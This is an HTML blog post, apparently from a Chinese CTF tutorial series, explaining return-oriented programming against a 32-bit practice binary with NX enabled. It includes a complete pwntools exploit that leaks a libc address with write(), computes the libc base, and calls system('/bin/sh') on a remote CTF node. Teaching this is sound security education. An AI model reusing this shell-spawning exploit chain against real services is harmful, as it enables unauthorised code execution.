@@ -1,0 +1,351 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>PWN从入门到放弃(11)——栈溢出之rop | 山深有杏&#39;s Blog</title>
+<link rel="shortcut icon" href="https://ssyxsec.com/favicon.ico?v=1735101861265">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ssyxsec.com/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="PWN从入门到放弃(11)——栈溢出之rop | 山深有杏&#39;s Blog - Atom Feed" href="https://ssyxsec.com/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="本来是想分享一下工具，但是单纯分享工具内容太少，于是这里再简单讲一下ROP
+0x00 什么是ROP
+ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各..." />
+    <meta name="keywords" content="CTF,Pwn" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ssyxsec.com">
+  <img class="avatar" src="https://ssyxsec.com/images/avatar.png?v=1735101861265" alt="">
+  </a>
+  <h1 class="site-title">
+    山深有杏&#39;s Blog
+  </h1>
+  <p class="site-description">
+    These Violent Delights Have Violent Ends.
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="https://ssyxsec.com/0mQfqrf6-n" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              PWN从入门到放弃(11)——栈溢出之rop
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-11-07
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+                <a href="https://ssyxsec.com/tag/mFiLVoNunh/" class="post-tag">
+                  # CTF
+                </a>
+              
+                <a href="https://ssyxsec.com/tag/BcBYBpcwgI/" class="post-tag">
+                  # Pwn
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>本来是想分享一下工具，但是单纯分享工具内容太少，于是这里再简单讲一下ROP</p>
+<h3 id="0x00-什么是rop">0x00 什么是ROP</h3>
+<p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。通过上一篇文章栈溢出漏洞原理详解与利用，我们可以发现栈溢出的控制点是ret处，那么ROP的核心思想就是利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。</p>
+<h3 id="0x01-为什么要rop">0x01 <strong>为什么要ROP</strong></h3>
+<p>探究原因之前，我们先看一下什么是NX(DEP) NX即No-execute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。所以就有了各种绕过办法，rop就是其中一种。</p>
+<p>注：通俗的来说，rop就是利用程序中已有的程序段来拼接一个我们需要的功能（函数）。</p>
+<h3 id="0x02-例题">0x02 例题</h3>
+<h4 id="1查看程序信息">1）查看程序信息</h4>
+<pre><code class="language-javascript">$ checksec 2018_rop
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://ssyxsec.com/post-images/1730959877409.png" alt="" loading="lazy"></figure>
+<p>32位程序，开启了NX保护（意味着栈不可执行）</p>
+<h4 id="2ida-pro-分析">2）IDA pro 分析</h4>
+<figure data-type="image" tabindex="2"><img src="https://ssyxsec.com/post-images/1730959885690.png" alt="" loading="lazy"></figure>
+<p>打开看到vulnerable_function()直接跟进</p>
+<figure data-type="image" tabindex="3"><img src="https://ssyxsec.com/post-images/1730959891717.png" alt="" loading="lazy"></figure>
+<p>read()函数处存在溢出，溢出偏移为0x8C</p>
+<p>根据我们之前讲的题目，这种只存在溢出的题目需要泄漏一个函数的实际地址，再计算libc基地址。</p>
+<p>但我们看左侧函数窗口，没有puts()、system()、也没有’/bin/sh’字符串。</p>
+<p>其实不光puts()函数可以打印函数的实际地址，write()函数也可以，之所以我们平时都用puts()函数，是因为puts()函数只有一个参数，使用起来方便。</p>
+<h4 id="3编写exp">3）编写exp</h4>
+<p>首先，先把脚本框架写好</p>
+<pre><code class="language-javascript"># -*- coding: utf-8 -*-
+from pwn import *
+pro = './2018_rop'
+context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]
+elf = ELF(pro)
+r = process(pro)
+context.os = 'linux'
+context.arch = elf.arch
+context.log_level = 'debug'
+
+rv = lambda x:r.recv(x)
+ru = lambda x:r.recvuntil(x)
+rud = lambda x:r.recvuntil(x,drop=True)
+rl = lambda x:r.recvline()
+sd = lambda x:r.send(x)
+sl = lambda x:r.sendline(x)
+sa = lambda x,y:r.sendafter(x,y)
+sla = lambda x,y:r.sendlineafter(x,y)
+
+if args.G:
+	gdb.attach(proc.pidof(r)[0])
+
+
+r.interactive()
+</code></pre>
+<p>接下来我们先把需要准备的地址准备好，之前我们都是用puts函数打印puts函数的实际地址，我们也可以用write函数打印write函数的实际地址（当然也可以打印其他函数的实际地址），这里我用wirte函数打印__libc_start_main函数的实际地址。</p>
+<pre><code class="language-javascript">padding = 0x8c
+write_plt = elf.plt['write']
+libc_start_main_got = elf.got['__libc_start_main']
+main_addr = 0x080484c6
+</code></pre>
+<p>下面我们就要构造一个rop链了，在构造之前，先来了解一下write函数</p>
+<p>函数定义：ssize_t write (int fd, const void * buf, size_t count);</p>
+<p>函数说明：write()会把参数buf所指的内存写入count个字节到参数放到fd所指的文件内。</p>
+<p>想要write函数将实际地址打印出来，只需要将fd置1，又因为这是32位程序，地址长度为4，所以count=4即可。</p>
+<pre><code class="language-javascript">pay = 'a' * padding
+pay += p32(write_plt)
+pay += p32(main_addr)
+pay += p32(1)
+pay += p32(libc_start_main_got)
+pay += p32(4)
+
+sl(pay)
+lsm_real_addr = u32(rv(4))
+print 'lsm_real_addr &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; ' + hex(lsm_real_addr)
+</code></pre>
+<p>rop链应该很容易看懂，不过多赘述</p>
+<p>接下来，需要计算libc的基地址，这里推荐一下LibcSearcher这个库</p>
+<p><a href="https://github.com/lieanu/LibcSearcher">LibcSearch-github</a></p>
+<p>安装方法</p>
+<pre><code class="language-javascript">$ git clone https://github.com/lieanu/LibcSearcher.git
+$ cd LibcSearcher
+$ python setup.py develop
+</code></pre>
+<p>使用方法也很简单，大家应该一看就能看懂。</p>
+<pre><code class="language-javascript">from LibcSearcher import *
+
+libc = LibcSearcher(&quot;gets&quot;,gets_real_addr)
+
+libc_base = gets_real_addr – libc.dump(&quot;fgets&quot;)
+system_addr = libc_base + libc.dump(&quot;system&quot;)
+bin_sh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)
+</code></pre>
+<p>那么我们这道题的libc基地址计算就照葫芦画瓢即可</p>
+<pre><code class="language-javascript">libc = LibcSearcher(&quot;__libc_start_main&quot;,lsm_real_addr)
+libc_base = lsm_real_addr - libc.dump('__libc_start_main')
+print 'libc_base &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; ' + hex(libc_base)
+system_addr = libc_base + libc.dump('system')
+bin_sh_addr = libc_base + libc.dump('str_bin_sh')
+</code></pre>
+<p>计算出基地址了，后面都是基本操作</p>
+<pre><code class="language-javascript">pay1 = 'a' * padding
+pay1 += p32(system_addr)
+pay1 += p32(main_addr)
+pay1 += p32(bin_sh_addr)
+
+sleep(1)
+sl(pay1)
+</code></pre>
+<h4 id="4完整exp">4）完整exp</h4>
+<pre><code class="language-javascript"># -*- coding: utf-8 -*-
+from pwn import *
+from LibcSearcher import *
+pro = './2018_rop'
+context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]
+elf = ELF(pro)
+#r = process(pro)
+r = remote('node3.buuoj.cn',26913)
+context.os = 'linux'
+context.arch = elf.arch
+context.log_level = 'debug'
+
+rv = lambda x:r.recv(x)
+ru = lambda x:r.recvuntil(x)
+rud = lambda x:r.recvuntil(x,drop=True)
+rl = lambda x:r.recvline()
+sd = lambda x:r.send(x)
+sl = lambda x:r.sendline(x)
+sa = lambda x,y:r.sendafter(x,y)
+sla = lambda x,y:r.sendlineafter(x,y)
+
+if args.G:
+    gdb.attach(proc.pidof(r)[0])
+
+padding = 0x88 + 0x4
+write_plt = elf.plt['write']
+libc_start_main_got = elf.got['__libc_start_main']
+main_addr = 0x080484c6
+
+pay = 'a' * padding
+pay += p32(write_plt)
+pay += p32(main_addr)
+pay += p32(1)
+pay += p32(libc_start_main_got)
+pay += p32(4)
+
+sl(pay)
+lsm_real_addr = u32(rv(4))
+print 'lsm_real_addr &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; ' + hex(lsm_real_addr) 
+libc = LibcSearcher(&quot;__libc_start_main&quot;,lsm_real_addr)
+libc_base = lsm_real_addr - libc.dump('__libc_start_main')
+print 'libc_base &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; ' + hex(libc_base)
+system_addr = libc_base + libc.dump('system')
+bin_sh_addr = libc_base + libc.dump('str_bin_sh')
+
+pay1 = 'a' * padding
+pay1 += p32(system_addr)
+pay1 += p32(main_addr)
+pay1 += p32(bin_sh_addr)
+
+sleep(1)
+sl(pay1)
+
+r.interactive()
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#0x00-%E4%BB%80%E4%B9%88%E6%98%AFrop">0x00 什么是ROP</a></li>
+<li><a href="#0x01-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81rop">0x01 <strong>为什么要ROP</strong></a></li>
+<li><a href="#0x02-%E4%BE%8B%E9%A2%98">0x02 例题</a>
+<ul>
+<li><a href="#1%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E4%BF%A1%E6%81%AF">1）查看程序信息</a></li>
+<li><a href="#2ida-pro-%E5%88%86%E6%9E%90">2）IDA pro 分析</a></li>
+<li><a href="#3%E7%BC%96%E5%86%99exp">3）编写exp</a></li>
+<li><a href="#4%E5%AE%8C%E6%95%B4exp">4）完整exp</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ssyxsec.com/jvi34Lubax/">
+              <h3 class="post-title">
+                PWN从入门到放弃(10)——栈溢出之ret2libc(x64)
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ssyxsec.com/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
